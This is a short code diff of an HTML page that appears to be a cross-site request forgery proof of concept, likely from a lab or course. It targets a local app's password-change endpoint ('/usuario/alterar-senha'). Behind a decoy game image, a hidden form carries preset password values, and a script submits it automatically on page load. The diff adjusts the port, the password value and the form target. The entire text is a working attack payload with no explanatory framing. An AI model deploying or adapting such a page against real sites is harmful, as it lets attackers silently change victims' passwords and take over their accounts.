@@ -7,9 +7,10 @@
 
 <body>
     <img src="./pixel-game.gif" alt="" />
-    <form enctype="multipart/form-data" action="http://localhost:3000/usuario/alterar-senha" method="post">
-        <input type="hidden" name="senha" value="123456" />
-        <input type="hidden" name="confirmacao" value="123456" />
+    <iframe name="iframe"></iframe>
+    <form enctype="multipart/form-data" action="http://localhost:8080/usuario/alterar-senha" method="post" target="_blank">
+        <input type="hidden" name="senha" value="1234" />
+        <input type="hidden" name="confirmacao" value="1234" />
     </form>
     <script>
         document.forms[0].submit()
